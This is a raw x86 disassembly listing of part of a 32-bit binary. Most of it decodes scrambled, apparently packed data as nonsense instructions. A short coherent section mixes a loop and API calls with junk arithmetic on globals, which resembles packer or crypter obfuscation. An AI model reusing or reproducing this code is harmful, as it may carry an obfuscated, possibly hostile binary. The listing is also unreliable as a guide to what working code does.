  407131:	ds jp  0x40712a
  407134:	jecxz  0x4070df
  407136:	sub    BYTE PTR [edi+0x28],dh
  407139:	cmc    
  40713a:	pop    esp
  40713b:	ss loopne 0x40710e
  40713e:	dec    edx
  40713f:	push   cs
  407140:	retf   0x883f
  407143:	fmul   QWORD PTR [esi-0x13]
  407146:	stos   BYTE PTR es:[edi],al
  407147:	xor    BYTE PTR [ebx],bh
  407149:	ret    0x53e5
  40714c:	test   edi,edi
  40714e:	mov    ecx,0x4e507aa9
  407153:	aas    
  407154:	or     ecx,esi
  407156:	cmp    DWORD PTR [ebp+0x43ffe184],esi
  40715c:	nop
  40715d:	push   0xffffffc2
  40715f:	sub    DWORD PTR [edx+0x52d307c8],ecx
  407165:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407166:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407167:	sar    eax,0x4b
  40716a:	sbb    BYTE PTR [ebp+0x3b2be710],cl
  407170:	inc    edx
  407171:	dec    esi
  407172:	es cmp ch,dl
  407175:	adc    BYTE PTR [eax],ah
  407177:	jecxz  0x407124
  407179:	clc    
  40717a:	aaa    
  40717b:	sbb    eax,0xd168c612
  407180:	pushf  
  407181:	jle    0x40713c
  407183:	mov    eax,ds:0x6f5f8a7
  407188:	retf   0xbe0f
  40718b:	jmp    0xc437:0xb77354c5
  407192:	call   0x3ad1:0x74bada62
  407199:	sub    DWORD PTR [edi-0x78],esp
  40719c:	ins    BYTE PTR es:[edi],dx
  40719d:	retf   0x66ee
  4071a0:	jg     0x407134
  4071a2:	mov    al,0xbb
  4071a4:	ret    0x5cf2
  4071a7:	outs   dx,BYTE PTR ds:[esi]
  4071a8:	push   edi
  4071a9:	fs fdivrp st(1),st
  4071ac:	adc    dl,cl
  4071ae:	daa    
  4071af:	sbb    al,0x34
  4071b1:	pop    ss
  4071b2:	jmp    0x40717f
  4071b4:	push   0xffffffb2
  4071b6:	daa    
  4071b7:	das    
  4071b8:	or     al,0x67
  4071ba:	ins    BYTE PTR es:[edi],dx
  4071bb:	add    DWORD PTR [edi],ebx
  4071bd:	mov    ds:0xf6bfbfe0,eax
  4071c2:	cmp    eax,0x54afe81b
  4071c7:	sbb    DWORD PTR [edx+0x6e032d2b],ebp
  4071cd:	das    
  4071ce:	inc    ebx
  4071cf:	adc    esp,ebp
  4071d1:	loopne 0x4071a0
  4071d3:	jmp    esi
  4071d5:	neg    BYTE PTR [esi]
  4071d7:	dec    ebp
  4071d8:	dec    esi
  4071d9:	push   es
  4071da:	idiv   BYTE PTR [ebx]
  4071dc:	adc    bh,BYTE PTR [edi]
  4071de:	loopne 0x40724b
  4071e0:	stos   DWORD PTR es:[edi],eax
  4071e1:	nop
  4071e2:	xlat   BYTE PTR ds:[ebx]
  4071e3:	push   edi
  4071e4:	mov    dh,BYTE PTR [esi-0x25]
  4071e7:	cwde   
  4071e8:	ror    ebx,0xe
  4071eb:	fstp   TBYTE PTR [ebp+0x49]
  4071ee:	jle    0x407251
  4071f0:	and    ah,dl
  4071f2:	sbb    ax,0xc6f2
  4071f6:	add    DWORD PTR [edi-0x7d8f9df0],edx
  4071fc:	adc    al,0x90
  4071fe:	mov    edx,gs
  407200:	into   
  407201:	dec    edi
  407202:	push   esi
  407203:	xchg   BYTE PTR [esi+0x4af6c4f0],bl
  407209:	cmp    al,0x5e
  40720b:	pop    eax
  40720c:	outs   dx,BYTE PTR ds:[esi]
  40720d:	pop    edi
  40720e:	shl    BYTE PTR [edi-0x7],cl
  407211:	repz and BYTE PTR [ebx],ah
  407214:	and    DWORD PTR [esi+0x7c0913b4],ecx
  40721a:	std    
  40721b:	inc    eax
  40721c:	jne    0x407201
  40721e:	mov    ebx,0x28afbe14
  407223:	xchg   esp,eax
  407224:	adc    ch,dl
  407226:	and    ecx,DWORD PTR [ecx+0x1]
  407229:	cmc    
  40722a:	jmp    0xe9d3:0xacc7beca
  407231:	ret    0x579f
  407234:	stc    
  407235:	cmp    edx,edi
  407237:	mov    ah,0xa9
  407239:	fld    DWORD PTR [di+0x10]
  40723d:	xchg   edi,eax
  40723e:	xchg   edx,eax
  40723f:	xor    al,0xb2
  407241:	clc    
  407242:	jne    0x40728e
  407244:	mov    ebx,edx
  407246:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407247:	enter  0xa038,0xfe
  40724b:	jnp    0x407228
  40724d:	pop    edx
  40724e:	pop    esp
  40724f:	pusha  
  407250:	jg     0x4071d4
  407252:	in     eax,0xd7
  407254:	pop    ecx
  407255:	out    dx,al
  407256:	and    BYTE PTR [ecx],0xac
  407259:	pop    ds
  40725a:	in     al,dx
  40725b:	jae    0x4071f8
  40725d:	mov    eax,0x65d720a
  407262:	cmc    
  407263:	(bad)  
  407265:	(bad)  
  407267:	data16 fimul DWORD PTR [ecx+0x2f66f1b2]
  40726e:	outs   dx,BYTE PTR ds:[esi]
  40726f:	repnz sbb BYTE PTR [edx-0x64],dl
  407273:	sbb    eax,0x27fb2aed
  407278:	ins    BYTE PTR es:[edi],dx
  407279:	adc    DWORD PTR [esi+0x7d],0x20417ce5
  407280:	sub    BYTE PTR [esp+ecx*2],0x1a
  407284:	test   ch,dh
  407286:	ds pushf 
  407288:	sub    edx,esi
  40728a:	out    0x14,al
  40728c:	ins    BYTE PTR es:[edi],dx
  40728d:	enter  0xcea5,0x61
  407291:	pop    esi
  407292:	cmp    al,0x8b
  407294:	popa   
  407295:	lods   eax,DWORD PTR ds:[esi]
  407296:	inc    ebx
  407297:	adc    ecx,DWORD PTR [ebx+0x2d]
  40729a:	dec    esi
  40729b:	pushf  
  40729c:	xor    eax,0x2d6e65e9
  4072a1:	fiadd  DWORD PTR [esi+ebx*2]
  4072a4:	and    eax,0x1d6730a0
  4072a9:	adc    ah,BYTE PTR [eax-0x7fd0bf09]
  4072af:	fsub   QWORD PTR [edx]
  4072b1:	add    ch,BYTE PTR [edi+0x210b5c31]
  4072b7:	adc    al,0xed
  4072b9:	je     0x4072d8
  4072bb:	jmp    0x65e8:0x347ba812
  4072c2:	out    0x22,al
  4072c4:	xchg   ebp,eax
  4072c5:	dec    edi
  4072c6:	mov    ah,0xd7
  4072c8:	loope  0x4072fe
  4072ca:	test   DWORD PTR [edi+0x64],edi
  4072cd:	xor    DWORD PTR [eax+0x5e5c4f1b],ebp
  4072d3:	cmp    BYTE PTR [ebp+0x421baf52],dl
  4072d9:	cdq    
  4072da:	call   0xdfcc9502
  4072df:	fsub   DWORD PTR fs:[ecx]
  4072e2:	icebp  
  4072e3:	and    al,BYTE PTR [esi+0x71]
  4072e6:	jg     0x4072f6
  4072e8:	adc    dh,BYTE PTR [ebp-0x67f65ce6]
  4072ee:	pop    edx
  4072ef:	popf   
  4072f0:	push   0x46
  4072f2:	adc    DWORD PTR [ebp-0x12],esp
  4072f5:	mov    esp,0x691b65dc
  4072fa:	mov    eax,ds:0x22f0f28d
  4072ff:	mov    ebx,0x6a006d13
  407304:	cmc    
  407305:	out    0xd7,al
  407307:	nop
  407308:	jbe    0x4072ad
  40730a:	jg     0x4072a8
  40730c:	fcomp  QWORD PTR [edi+0x263bbea]
  407312:	adc    DWORD PTR [edi+0x7b],esi
  407315:	xchg   esi,eax
  407316:	mov    edx,DWORD PTR [ebx]
  407318:	inc    ebp
  407319:	dec    esp
  40731a:	ror    BYTE PTR [ebx-0x21],cl
  40731d:	loop   0x4072e2
  40731f:	and    al,0x6e
  407321:	push   esi
  407322:	push   eax
  407323:	nop
  407324:	test   ecx,ebp
  407326:	mov    ebp,0xbf631687
  40732b:	push   ebp
  40732c:	cs pop edx
  40732e:	(bad)  
  407330:	int    0xb4
  407332:	cmp    eax,0xd919fcdd
  407337:	jb     0x4072ee
  407339:	std    
  40733a:	mov    cs,WORD PTR [eax+0x65a742dc]
  407340:	jns    0x4072f6
  407342:	xlat   BYTE PTR ds:[ebx]
  407343:	mov    edx,DWORD PTR [ebx]
  407345:	or     dh,BYTE PTR [esi-0x7e0bba75]
  40734b:	add    eax,0x42fd51
  407350:	and    edi,0x42
  407353:	add    BYTE PTR [ebx],dh
  407355:	mov    BYTE PTR [ecx+0x42fd7d05],0x0
  40735c:	not    BYTE PTR [edi+0x0]
  40735f:	add    BYTE PTR [ebx],al
  407361:	mov    DWORD PTR [ecx+0x42e78f35],0x2a1100
  40736b:	add    BYTE PTR [ecx+0x45c7e845],cl
  407371:	in     al,0x3c
  407373:	test   DWORD PTR [eax+edi*8+0x67ff45c6],ebx
  40737a:	and    DWORD PTR ds:0x42fd7d,0x0
  407384:	mov    eax,ds:0x42fd7d
  407389:	inc    eax
  40738a:	mov    ds:0x42fd7d,eax
  40738f:	cmp    DWORD PTR ds:0x42fd7d,0xe
  407396:	jne    0x4073a2
  40739c:	call   DWORD PTR ds:0x42e4df
  4073a2:	cmp    DWORD PTR ds:0x42fd7d,0xd
  4073a9:	jne    0x4073ba
  4073af:	mov    eax,ds:0x42fd7d
  4073b4:	inc    eax
  4073b5:	mov    ds:0x42fd7d,eax
  4073ba:	cmp    DWORD PTR ds:0x42fd7d,0x1d
  4073c1:	jb     0x407384
  4073c7:	mov    eax,DWORD PTR [ebp-0xc]
  4073ca:	xor    eax,esi
  4073cc:	and    DWORD PTR ds:0x42e1a8,0xdb
  4073d6:	add    eax,edi
  4073d8:	or     DWORD PTR ds:0x42e787,0x71a5
  4073e2:	mov    DWORD PTR [ebp-0x18],eax
  4073e5:	adc    eax,0x7137
  4073ea:	jmp    0x407737
  4073ef:	or     DWORD PTR ds:[edi],eax
  4073f2:	(bad)  
  4073f3:	rcl    edx,cl
  4073f5:	cmp    DWORD PTR [ecx],edx
  4073f7:	pop    ecx
  4073f8:	jns    0x4073c5
  4073fa:	popa   
  4073fb:	fsubr  QWORD PTR es:[edx+0x70cff79d]
  407402:	jo     0x407424
  407404:	jge    0x407476
  407406:	jo     0x4073a3
  407408:	cwde   
  407409:	mov    ebx,0xc76d8c05
  40740e:	(bad)  
  40740f:	(bad)  
  407410:	out    dx,eax
  407411:	fmul   DWORD PTR ds:0xc51e6624
  407417:	dec    esp
  407418:	aam    0x5a
  40741a:	sub    al,0xa7
  40741c:	mov    eax,ds:0xd7b3a003
  407421:	stos   DWORD PTR es:[edi],eax
  407422:	aad    0x79
  407424:	cmp    BYTE PTR [esi-0x59],bl
  407427:	dec    edx
  407428:	cmp    BYTE PTR [ecx],al
  40742a:	pop    esi
  40742b:	cdq    
  40742c:	add    al,0x25
  40742e:	push   ss
  40742f:	adc    DWORD PTR [ebx],0xffffffbf
  407432:	add    eax,0xeba910b6
  407437:	jecxz  0x4073bb
  407439:	dec    ecx
  40743a:	mov    ebp,DWORD PTR [ebx+0x6d038e1]
  407440:	enter  0xa1da,0x4f
  407444:	inc    ebp
  407445:	cdq    
  407446:	mov    bh,cl
  407448:	stc    
  407449:	jo     0x40740b
  40744b:	mov    ah,0x3
  40744d:	das    
  40744e:	add    al,dl
  407450:	ret    
  407451:	das    
  407452:	jnp    0x407445
  407454:	gs pop esi
  407456:	push   esp
  407457:	es cwde 
  407459:	inc    edx
  40745a:	iret   
  40745b:	dec    ecx
  40745c:	pop    es
  40745d:	jbe    0x40740a
  40745f:	pusha  
  407460:	add    eax,0xb57f6cc8
  407465:	xchg   esp,eax
  407466:	je     0x407495
  407468:	dec    ecx
  407469:	sub    dh,dl
  40746b:	shl    DWORD PTR [edi+0x2e],1
  40746e:	adc    BYTE PTR [esi-0x4a],dh
  407471:	cmp    DWORD PTR [ebx],ecx
  407473:	add    DWORD PTR [eax-0x55],edx
  407476:	mov    ch,0x22
  407478:	sti    
  407479:	jl     0x4074af
  40747b:	or     dl,dh
  40747d:	imul   esi,DWORD PTR [edx+0x7733ef41],0xffffff88
  407484:	int3   
  407485:	leave  
  407486:	inc    ebx
  407487:	cmp    BYTE PTR [edx+edx*4-0x2bb330a],dl
  40748e:	ins    DWORD PTR es:[edi],dx
  40748f:	jbe    0x4074dc
  407491:	pop    eax
  407492:	and    DWORD PTR [eax+edi*1],0x36952f37
  407499:	sar    DWORD PTR [esp+edi*2],0xcf
  40749d:	fist   WORD PTR cs:[edi+0x7d]
  4074a1:	fs jne 0x40749a
  4074a4:	pop    ss
  4074a5:	mov    bh,0x36
  4074a7:	jo     0x40742d
  4074a9:	or     DWORD PTR [eax],ebx
  4074ab:	int3   
  4074ac:	inc    ebx
  4074ad:	sbb    al,0xc2
  4074af:	push   ds
  4074b0:	inc    esp
  4074b1:	mov    dh,0x76
  4074b3:	cmp    al,0x77
  4074b5:	mov    DWORD PTR [ebx],0x730f6154
  4074bb:	je     0x40751e
  4074bd:	adc    DWORD PTR [ebp+0x3e69adeb],ecx
  4074c3:	and    esi,esi
  4074c5:	dec    ecx
  4074c6:	sub    al,0x23
  4074c8:	cld    
  4074c9:	into   
  4074ca:	jae    0x407540
  4074cc:	imul   ecx,DWORD PTR [ecx],0xffffff99
  4074cf:	or     eax,DWORD PTR [edi+0x16]
  4074d2:	mov    ds:0x26260c3f,eax
  4074d7:	cmp    esp,DWORD PTR [edi]
  4074d9:	int3   
  4074da:	js     0x40749f
  4074dc:	ja     0x40753b
  4074de:	jns    0x40748c
  4074e0:	mov    bh,0x53
  4074e2:	push   edx
  4074e3:	retf   
  4074e4:	outs   dx,BYTE PTR ds:[esi]
  4074e5:	mov    al,gs:0x26f0d8b9
  4074eb:	push   esp
  4074ec:	call   0x5ef1d24a
  4074f1:	cmp    DWORD PTR [ebx+0x1c64a52c],edx
  4074f7:	mov    dl,0xb
  4074f9:	and    eax,edi
  4074fb:	aam    0x45
  4074fd:	pop    DWORD PTR [edi]
  4074ff:	cmc    
  407500:	aaa    
  407501:	jnp    0x407574
  407503:	lds    edi,FWORD PTR [ebx]
  407505:	repz lock (bad) [esi-0x21221764]
  40750d:	sub    al,0x9e
  40750f:	cs mov ch,0xef
  407512:	das    
  407513:	and    BYTE PTR [eax+0x131142fa],ah
  407519:	scas   eax,DWORD PTR es:[edi]
  40751a:	push   0x6a
  40751c:	mov    ebx,0x735115f0
  407521:	cmp    BYTE PTR [edi-0x32],cl
  407524:	fnstcw WORD PTR [esi+edx*8-0x77403194]
  40752b:	sbb    bh,BYTE PTR ds:0x8a4985a5
  407531:	cmp    DWORD PTR [esi-0x4d2081cc],0x11c3c369
  40753b:	sbb    bh,bh
  40753d:	hlt    
  40753e:	push   esp
  40753f:	pushf  
  407540:	rcl    BYTE PTR [ebx+0x65],1
  407543:	leave  
  407544:	fmul   QWORD PTR [eax+0x6e569bc1]
  40754a:	mov    esi,0xab276112
  40754f:	xchg   esi,eax
  407550:	pop    ebp
  407551:	or     DWORD PTR [ebx],esp
  407553:	sar    cl,1
  407555:	jmp    0xc0cf:0x28aba4b7
  40755c:	inc    edx
  40755d:	aam    0x96
  40755f:	xor    BYTE PTR [ecx+edx*4],0x7b
  407563:	and    BYTE PTR [ebx-0x48d8ecd4],dh
  407569:	push   eax
  40756a:	jbe    0x4075c0
  40756c:	pushf  
  40756d:	sar    DWORD PTR [edi],cl
  40756f:	bound  esp,QWORD PTR [ecx+0x46]
  407572:	sbb    edx,DWORD PTR cs:[ecx+0x6a156c41]
  407579:	inc    ebx
  40757a:	jbe    0x4075d5
  40757c:	inc    esi
  40757d:	push   0xffffffc0
  40757f:	jle    0x407524
  407581:	and    ebx,DWORD PTR [edi+0x671664aa]
  407587:	in     al,dx
  407588:	jmp    0x4075e5
  40758a:	push   ds
  40758b:	inc    eax
  40758c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40758d:	retf   
  40758e:	push   esp
  40758f:	push   0x3c49946a
  407594:	adc    eax,0x5d25b144
  407599:	sahf   
  40759a:	mov    edi,0x22f0f266
  40759f:	shl    DWORD PTR [ebx+eax*4+0x1a],1
  4075a3:	jns    0x407562
  4075a5:	or     DWORD PTR [edi],esp
  4075a7:	jp     0x407538
  4075a9:	sbb    al,0x6b
  4075ab:	pop    esi
  4075ac:	push   edx
  4075ad:	sti    
  4075ae:	aam    0xf2
  4075b0:	cmp    cl,BYTE PTR [ebp+0x67]
  4075b3:	test   BYTE PTR [ebx-0x40609b73],al
  4075b9:	jnp    0x4075d6
  4075bb:	inc    ecx
  4075bc:	mov    ecx,0x67c865b6
  4075c1:	adc    ecx,DWORD PTR [ecx]
  4075c3:	fistp  QWORD PTR [ebx]
  4075c5:	lods   al,BYTE PTR ds:[esi]
  4075c6:	mov    edx,0x82a99acb
  4075cb:	sub    DWORD PTR [ecx],edx
  4075cd:	pop    ebp
  4075ce:	retf   0xd7c4
  4075d1:	test   DWORD PTR [ebx-0x1a],edi
  4075d4:	jmp    0x40762f
  4075d6:	retf   
  4075d7:	out    dx,al
  4075d8:	test   BYTE PTR [ecx],ah
  4075da:	mov    ds:0xe5122f2b,al
  4075df:	push   cs
  4075e0:	jl     0x4075fc
  4075e2:	cld    
  4075e3:	mov    ds:0xa6a267a0,al
  4075e8:	mov    cl,0xe9
  4075ea:	inc    edx
  4075eb:	or     ebx,DWORD PTR [edx+0x49]
  4075ee:	es sbb bh,al
  4075f1:	sbb    al,0x27
  4075f3:	mov    edi,DWORD PTR [esi]
  4075f5:	cmc    
  4075f6:	mul    BYTE PTR [eax]
  4075f8:	icebp  
  4075f9:	repz adc al,0x50
  4075fc:	adc    eax,0xfb7c2857
  407601:	nop
  407602:	cli    
  407603:	push   ss
  407604:	ins    DWORD PTR es:[edi],dx
  407605:	jmp    0x407663
  407607:	setne  BYTE PTR [ebx+0x66]
  40760b:	sbb    BYTE PTR [esi],bh
  40760d:	add    DWORD PTR [edx-0x79],0xd1c4c605
  407614:	(bad)  
  407615:	test   eax,0x4d8cc5aa
  40761a:	scas   eax,DWORD PTR es:[edi]
  40761b:	sub    edx,DWORD PTR [edi+0x6501d0dc]
  407621:	ja     0x407644
  407623:	sbb    eax,DWORD PTR [esi+0x39]
  407626:	daa    
  407627:	mov    esi,0xae413dfa
  40762c:	mov    bl,0x2d
  40762e:	jecxz  0x4075d5
  407630:	cmp    DWORD PTR [ebx],ecx
  407632:	jae    0x40767e
  407634:	out    0x62,al
  407636:	xchg   ebx,eax
  407637:	hlt    
  407638:	fmul   st,st(5)
  40763a:	xor    bl,dl
  40763c:	ja     0x407685
  40763e:	xchg   ecx,eax
  40763f:	mov    al,ds:0x5cbb2d31
  407644:	(bad)  
  407646:	loop   0x407680
  407648:	call   0x27a15fd4
  40764d:	or     eax,0x8b12e72c
  407652:	push   ds
  407653:	in     al,0x99
  407655:	and    DWORD PTR [ebx-0x20],ebp
  407658:	cmp    DWORD PTR [ebx],edi
  40765a:	cld    
  40765b:	mov    ebx,0x8ab0f0e6
  407660:	jmp    0x407682
  407662:	sub    al,0x1f
  407664:	xor    BYTE PTR [esi-0x4a],al
  407667:	outs   dx,DWORD PTR ds:[esi]
  407668:	pop    ss
  407669:	shufps xmm1,xmm3,0xcd
  40766d:	and    cl,BYTE PTR [edi]
  40766f:	enter  0x17e9,0xf8
  407673:	or     dh,BYTE PTR [edi+0x42eaca7d]
  407679:	mov    bl,0xb7
  40767b:	sub    cl,cl
  40767d:	fisub  WORD PTR [edi+ebx*2]
  407680:	inc    edx
  407681:	cmp    ecx,ecx
  407683:	pop    ebp
  407684:	add    eax,0x313b2e4f
  407689:	fld    TBYTE PTR [ecx]
  40768b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40768c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40768d:	xchg   ebx,eax
  40768e:	bound  esp,QWORD PTR [ebx]
  407690:	enter  0xcbb3,0xae
  407694:	test   al,0xbb
  407696:	pop    ds
  407697:	pop    esi
  407698:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407699:	sar    BYTE PTR [edx-0x7e70b852],1
  40769f:	(bad)  
  4076a0:	dec    ebx
  4076a1:	fwait
  4076a2:	xchg   ebp,ebp
  4076a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4076a5:	mov    ch,0xca
  4076a7:	push   edi
  4076a8:	mov    BYTE PTR [ecx+0x1b],cl
  4076ab:	shl    BYTE PTR ds:0x8bcddf09,cl
  4076b1:	std    
  4076b2:	repz inc edi
  4076b4:	mov    al,0x75
  4076b6:	aaa    
  4076b7:	sbb    BYTE PTR [ecx-0x742dd78b],dl
  4076bd:	cmp    al,0xe
  4076bf:	adc    cl,BYTE PTR [ecx-0x4f]
  4076c2:	push   edx
  4076c3:	mov    al,ds:0xa017446a
  4076c8:	es and eax,0x7511f2b5
  4076ce:	push   ebx
  4076cf:	sub    al,0xd8
  4076d1:	or     al,0x8d
  4076d3:	xor    edx,DWORD PTR [ebx]
  4076d5:	push   ecx
  4076d6:	call   0x3ac1:0x7f8200bb
  4076dd:	(bad)
  4076e1:	or     bh,bl
  4076e3:	aaa    
  4076e4:	pop    edx
  4076e5:	and    eax,0xfd2f4fe
  4076ea:	and    eax,0x83fd2d93
  4076ef:	imul   ebp,DWORD PTR es:[eax+0x2cda5829],0x4a8e867b
  4076fa:	mov    al,ds:0x597ec347
  4076ff:	cmp    DWORD PTR [ebp+edi*8+0x46],edx
  407703:	add    DWORD PTR [edi],eax
  407705:	sub    al,0x4d
  407707:	xor    DWORD PTR [esi],esp
  407709:	dec    sp
  40770b:	loopne 0x4076a1
  40770d:	jmp    0xdb2a6aea
  407712:	sahf   
  407713:	inc    eax
  407714:	mov    bl,dl
  407716:	sbb    al,0x2
  407718:	call   0xca93:0x8ae09e5e
  40771f:	ret    
  407720:	test   al,0x73
  407722:	dec    ebx
  407723:	retf   
  407724:	add    DWORD PTR [edi+0x4b],eax
  407727:	xor    eax,0x2e55fcbb
  40772c:	mov    fs,WORD PTR [edx+0x6f0e26b9]
  407732:	xor    BYTE PTR [ebp+0x1d],0x47
  407736:	xchg   edx,eax
  407737:	mov    eax,DWORD PTR [ebp-0x24]
  40773a:	xor    eax,esi
  40773c:	add    eax,edi
  40773e:	adc    DWORD PTR ds:0x42e19c,0x42fd89
  407748:	push   eax
  407749:	inc    eax
  40774a:	mov    eax,DWORD PTR [ebp-0x28]
  40774d:	sbb    DWORD PTR ds:0x42fd51,0x6777
  407757:	xor    eax,esi
  407759:	add    eax,edi
  40775b:	push   eax
  40775c:	mov    eax,DWORD PTR [ebp-0x1c]
  40775f:	or     DWORD PTR ds:0x42e76f,0x4a3f
  407769:	xor    eax,esi
  40776b:	add    DWORD PTR ds:0x42fd71,0x266c
  407775:	add    eax,edi
  407777:	xor    DWORD PTR ds:0x42e78f,0x42e76b
  407781:	push   eax
  407782:	lea    eax,[ebp-0x78]
  407785:	push   eax
  407786:	add    DWORD PTR ds:0x42e77f,0x5eb6
  407790:	push   DWORD PTR [ebp-0xc]
  407793:	adc    DWORD PTR ds:0x42e783,0x2bbb
  40779d:	push   DWORD PTR [ebp-0x14]
  4077a0:	call   0x405e60
  4077a5:	adc    DWORD PTR ds:0x42fd65,0x42fdee
  4077af:	test   eax,eax
  4077b1:	je     0x407e83
  4077b7:	lea    eax,[ebp-0x78]
  4077ba:	sbb    DWORD PTR ds:0x42fe02,0x6660
  4077c4:	push   eax
  4077c5:	mov    eax,DWORD PTR [ebp-0x14]
  4077c8:	jmp    0x407b15
  4077cd:	xlat   BYTE PTR ds:[ebx]
  4077ce:	and    BYTE PTR [eax+eiz*8+0x73],ch
  4077d2:	ins    BYTE PTR es:[edi],dx
  4077d3:	push   ebx
  4077d4:	aaa    
  4077d5:	pop    edx
  4077d6:	push   ecx
  4077d7:	push   ebx
  4077d8:	sahf   
  4077d9:	mov    esi,0xa7a7345d
  4077de:	int3   
  4077df:	jo     0x407851
  4077e1:	and    BYTE PTR [ebp+0x70],bh
  4077e4:	jo     0x40777a
  4077e6:	cdq    
  4077e7:	xchg   esp,eax
  4077e8:	or     BYTE PTR [esi],0xcc
  4077eb:	xor    ebx,DWORD PTR ds:0xe3d90005
  4077f1:	(bad)  
  4077f2:	shr    BYTE PTR [ebx-0x31],1
  4077f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077f6:	out    0x53,al
  4077f8:	mov    edx,0x544f5fcd
  4077fd:	(bad)  
  4077fe:	mov    edx,0x18763f41
  407803:	sbb    eax,0xc147a19b
  407808:	jmp    0x40783e
  40780a:	mov    edx,0x2491f886
  40780f:	call   0x3f69eeb3
  407814:	ror    DWORD PTR [ebx+0x6bd6c234],0x4f
  40781b:	pop    ebx
  40781c:	jp     0x4077b0
  40781e:	lahf   
  40781f:	mov    al,es:0x7f085250
  407825:	aad    0x7
  407827:	mov    DWORD PTR ds:0xfd6900e5,ebp
  40782d:	xor    al,0x55
  40782f:	jns    0x40788d
  407831:	out    0x85,al
  407833:	dec    esp
  407834:	mov    esi,0x71b378fc
  407839:	das    
  40783a:	and    al,0xe6
  40783c:	and    edx,eax
  40783e:	aad    0x6
  407840:	sahf   
  407841:	mov    edi,0x63e8097b
  407846:	add    eax,0xd906627c
  40784b:	or     ebp,ebp
  40784d:	div    BYTE PTR [ebp+0x4691c7c9]
  407853:	cld    
  407854:	(bad)  
  407856:	adc    ecx,DWORD PTR [ebp-0x4a]
  407859:	(bad)  
  40785a:	mov    edi,0x78d9599c
  40785f:	jecxz  0x4077ff
  407861:	repnz int 0x8e
  407864:	leave  
  407865:	xchg   ebp,eax
  407866:	stc    
  407867:	aad    0x86
  407869:	shr    BYTE PTR [ebx+ecx*1+0x5f],0xc6
  40786e:	test   DWORD PTR [ebx+0x22471937],0xe06fc1fa
  407878:	clc    
  407879:	dec    edx
  40787a:	jge    0x407815
  40787c:	ret    0xa3b5
  40787f:	je     0x4078ec
  407881:	in     eax,dx
  407882:	jmp    0xcc29:0x5e28ff1e
  407889:	push   0xf4744d36
  40788e:	adc    eax,0xc608e82
  407893:	cmp    eax,esi
  407895:	sub    DWORD PTR [eax+0x72a057b7],edx
  40789b:	pop    ds
  40789c:	cli    
  40789d:	pop    ds
  40789e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40789f:	(bad)  
  4078a0:	clc    
  4078a1:	stc    
  4078a2:	das    
  4078a3:	or     DWORD PTR [esi-0x5a],ebp
  4078a6:	or     al,0x7e
  4078a8:	aaa    
  4078a9:	jne    0x407926
  4078ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4078ac:	fsub   QWORD PTR [esi+ebx*2+0x261b1efb]
  4078b3:	pop    eax
  4078b4:	xchg   BYTE PTR [ecx],al
  4078b6:	gs sub eax,0xbe26d88c
  4078bc:	jno    0x407938
  4078be:	fsubr  DWORD PTR [ebx-0x7e]
  4078c1:	fucomp st(4)
  4078c3:	cmc    
  4078c4:	xchg   ebx,eax
  4078c5:	pop    ss
  4078c6:	mov    edi,0x337b0056
  4078cb:	(bad)  
  4078cc:	arpl   WORD PTR [edi+edx*1-0x41],dx
  4078d0:	cmp    bh,bh
  4078d2:	mov    cl,0x12
  4078d4:	adc    esp,DWORD PTR [esi+0x3]
  4078d7:	nop
  4078d8:	pop    DWORD PTR [edi]
  4078da:	xor    eax,0xb6c4a11
  4078df:	mov    bl,0xaa
  4078e1:	gs mov cl,0xb6
  4078e4:	or     dl,bl
  4078e6:	fwait
  4078e7:	ss out 0x3e,al
  4078ea:	push   ecx
  4078eb:	lock imul ebx,DWORD PTR [ebx+ecx*1],0x56
  4078f0:	or     DWORD PTR ds:[edi-0x7c3a0413],edx
  4078f7:	push   ebp
  4078f8:	adc    DWORD PTR [edi-0x3d],ebp
  4078fb:	xor    BYTE PTR [eax+0x622c1e93],ah
  407901:	addr16 sub al,0xd5
  407904:	and    DWORD PTR [eax+0x7739f790],edi
  40790a:	xor    edx,ebp
  40790c:	mov    esi,?
  40790e:	loop   0x4078d3
  407910:	ror    BYTE PTR [eax],1
  407912:	sub    DWORD PTR [ecx+0x73],esi
  407915:	lahf   
  407916:	mov    ebp,0x12e1611a
  40791b:	popa   
  40791c:	repz mov edi,0x95294a32
  407922:	(bad)  
  407923:	(bad)  
  407924:	retf   
  407925:	pushf  
  407926:	pop    ebx
  407927:	(bad)  
  407928:	xor    edi,DWORD PTR [eax+edx*8]
  40792b:	pusha  
  40792c:	test   al,0x5
  40792e:	popf   
  40792f:	lock xchg esi,eax
  407931:	xchg   esp,eax
  407932:	cmc    
  407933:	fstp   TBYTE PTR [eax-0x34beb935]
  407939:	(bad)  
  40793b:	pop    ecx
  40793c:	jne    0x407946
  40793e:	sbb    esi,edx
  407940:	ds lahf 
  407942:	jl     0x4078d2
  407944:	push   esp
  407945:	inc    esi
  407946:	mov    WORD PTR [eax+0x1d517aa0],?
  40794c:	xlat   BYTE PTR ds:[ebx]
  40794d:	cmp    DWORD PTR [eax],ebp
  40794f:	push   ds
  407950:	outs   dx,BYTE PTR ds:[esi]
  407951:	ins    DWORD PTR es:[edi],dx
  407952:	push   0x25
  407954:	or     BYTE PTR [eax+0xa],al
  407957:	call   0xa99f:0xd060737c
  40795e:	pop    esp
  40795f:	inc    esp
  407960:	iret   
  407961:	add    eax,0x3856e3f9
  407966:	stc    
  407967:	imul   edx,ebx,0xfffffff1
  40796a:	dec    eax
  40796b:	dec    ebx
  40796c:	push   edi
  40796d:	aaa    
  40796e:	and    bl,dh
  407970:	les    edx,FWORD PTR [eax+0x13]
  407973:	pop    edi
  407974:	stos   BYTE PTR es:[edi],al
  407975:	call   0xa2f5:0x9bb46d6b
  40797c:	fmul   DWORD PTR [ecx-0x25bdf9d1]
  407982:	inc    ecx
  407983:	shl    DWORD PTR [ebp-0x5ff300d0],1
  407989:	add    DWORD PTR [ebx+0x4f],0xffffff8f
  40798d:	call   0xc4ae:0x8d41f0fe
  407994:	push   eax
  407995:	cli    
  407996:	pop    esi
  407997:	xchg   ebx,eax
  407998:	aam    0x50
